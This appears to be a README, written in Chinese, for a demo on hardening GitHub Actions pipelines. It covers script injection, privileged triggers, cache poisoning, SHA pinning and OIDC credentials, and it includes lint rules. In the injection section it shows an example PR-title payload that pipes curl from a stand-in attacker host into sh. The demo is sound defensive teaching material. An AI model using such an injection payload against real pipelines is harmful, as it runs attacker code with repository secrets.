# CI 流水线加固：攻击者能控制的那部分输入

CI 流水线的特殊性在于：**它会以仓库的凭据去执行一部分由外部贡献者提供的内容**。
GitHub 官方加固文档把风险点归为几类，它们有一个共同结构——
**攻击者可控的输入** × **流水线对该输入的默认信任**。

本 demo 把四类问题各自做成一个**可判定的检查**，并给出修复后的对照。

## 原理详解

### 1. 脚本注入：表达式被拼进 shell 文本

`${{ github.event.pull_request.title }}` 是在 YAML 解析**之前**做文本替换的。
如果它出现在 `run:` 里，替换结果**就是 shell 脚本文本的一部分**：

```yaml
run: echo "PR title: ${{ github.event.pull_request.title }}"
```

攻击者把 PR 标题写成 `a"; curl http://evil.example/x | sh #`，渲染后：

```sh
echo "PR title: a"; curl http://evil.example/x | sh #"
```

引号被提前闭合，`curl ... | sh` 落在**引号之外**，会被执行。

判据（本 demo 的 `outside_quotes_contains`）：按 `"` 切分脚本，
**偶数下标段**即引号外——只有出现在那里才会被当成命令。

正确写法是把值放进 `env:`，脚本只引用变量：

```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "PR title: $TITLE"
```

此时值进入的是 runner 的**环境变量**（内存），不参与脚本生成，注入失效。
文档还给了另一种写法：写成 JavaScript action，把上下文值作为**参数**传入。
注意：**不要**自作聪明写成 `TITLE='${{ ... }}'`——单引号同样会被单引号闭合。

### 2. 特权触发器 + 检出不受信任代码

`pull_request_target` 与 `workflow_run` 是**特权**触发器：它们可能持有仓库写权限
并能访问 secrets。文档的要求是：

- 尽量避免使用 `pull_request_target`；
- 需要在工作流间做权限分离时，`workflow_run` 优于 `pull_request_target`；
- 使用这些触发器的工作流**不得显式检出不受信任代码**（PR fork 的内容）。

### 3. 缓存 / 制品投毒

文档明确：`pull_request_target` 和 `workflow_run`
**与其它特权触发器共享主分支的同一缓存**。如果这样的工作流又检出了不受信任的 PR 代码，
攻击者就能投毒缓存；再叠加仓库写权限与 secrets 访问能力，可导致仓库被接管。

此外 job 之间**并不隔离**：一个 job 往共享目录写文件，后续 job 会去处理；
所以 `workflow_run` 触发的工作流对**从其他工作流上传的制品**必须保持不信任。

### 4. 第三方 action 必须固定到完整 commit SHA

文档原话：

> Pinning an action to a full-length commit SHA is currently the **only** way to use an
> action as an immutable release.

原因是 **tag 可以被移动或删除**——只要拿到 action 仓库的访问权限就能改。
本 demo 用 `resolve_action` 模拟：同一个 `@v3` 在正常和「被移动」两种情形下解析到
不同的 commit；而 `@<40 位 SHA>` 的解析结果不受影响（要伪造需制造 SHA-1 碰撞）。

### 5. 令牌权限与长期凭据

- `GITHUB_TOKEN`：默认应只给**仓库内容读权限**，再按单个 job 的需要提升。
- 云凭据：用 **OIDC** 向云厂商换取**短期、范围受限**的令牌，
  从而不再把长期凭据存成 secret。本 demo 量化了这一点——

| 凭据类型 | 签发后 2 分钟泄露，攻击者还能用 |
| --- | --- |
| 长期 secret（按 10 年计） | 315359880 秒 |
| OIDC 短期令牌（15 分钟） | **780 秒** |

轮换解决的是「有效期」，OIDC 直接把有效期压到分钟级。

### 6. 六条规则与对照

| ID | 级别 | 判据 |
| --- | --- | --- |
| R1 | CRITICAL | `run` 里出现不受信任表达式 |
| R2 | CRITICAL | 特权触发器 + 检出 PR 头 |
| R3 | HIGH | 特权触发器 + 使用缓存 |
| R4 | MEDIUM | `GITHUB_TOKEN` 未做最小权限配置 |
| R5 | MEDIUM | 第三方 action 未固定到完整 SHA |
| R6 | MEDIUM | 使用长期云凭据而非 OIDC |

坏流水线 6 条全中，好流水线 0 条。规则之间是**正交**的：
只改其中一项只会触发对应那一条（自检里有单独验证）。

## 代码结构

| 文件 | 内容 |
| --- | --- |
| `ci_hardening.py` | 注入渲染、引号外判定、action 解析、凭据窗口、六条 lint |
| `ci_hardening_selftest.py` | 30 项断言 |
| `ci_hardening.go` | Go 版（regexp） |
| `ci_hardening.c` | C 版（**无正则**：表达式用子串判、SHA 用 40 位十六进制判） |

## 运行

```bash
python ci_hardening.py             # 打印四类演示 + lint 对照
python ci_hardening_selftest.py    # 30 项断言
go run ci_hardening.go
cc -o ci ci_hardening.c && ./ci
```

## 参考资料

- <https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions> —— GitHub Actions 安全加固：secrets 屏蔽与轮换、`GITHUB_TOKEN` 最小权限、脚本注入防护（env 中间变量 / action 参数）、`pull_request_target` 与 `workflow_run` 的特权语义与共享主分支缓存、第三方 action 固定到完整 commit SHA、制品投毒、用 OIDC 换取短期令牌替代长期 secret
